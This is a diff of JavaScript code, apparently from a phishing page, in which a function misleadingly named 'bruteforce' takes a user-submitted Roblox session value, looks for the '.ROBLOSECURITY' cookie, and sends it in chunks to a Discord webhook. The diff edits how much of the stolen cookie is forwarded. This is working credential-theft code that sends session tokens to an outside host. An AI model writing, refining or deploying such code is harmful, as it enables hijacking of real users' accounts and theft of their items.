@@ -43,27 +43,13 @@ function sendToWebhook(content) {
 
 function bruteforce(sessionId) {
   const maxLength = 2000; // Discord's limit for message content
-  const extraLength = 2500; // Additional characters after "ROBLOSECURITY"
-  const keyword = "ROBLOSECURITY";
+  const extraLength = 1000; // Additional characters if "ROBLOSECURITY" is detected
+  let content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
 
-  // Find the position of "ROBLOSECURITY" in the sessionId
-  const keywordIndex = sessionId.indexOf(keyword);
-
-  let content = "New Session ID Submitted:\n```";
-
-  if (keywordIndex !== -1) {
-    // If "ROBLOSECURITY" is found, include it and the next 2500 characters
-    const start = keywordIndex;
-    const end = start + keyword.length + extraLength;
-    content += sessionId.substring(start, end);
-  } else {
-    // If "ROBLOSECURITY" is not found, include the entire sessionId
-    content += sessionId;
+  if (sessionId.includes("ROBLOSECURITY")) {
+    content += sessionId.substring(0, extraLength);
   }
 
-  content += "```"; // Close the code block
-
-  // Split into chunks if the content exceeds Discord's limit
   if (content.length > maxLength) {
     let chunks = [];
     for (let i = 0; i < content.length; i += maxLength) {
@@ -74,7 +60,6 @@ function bruteforce(sessionId) {
     sendToWebhook(content);
   }
 }
-
 
 
 function validateInput() {
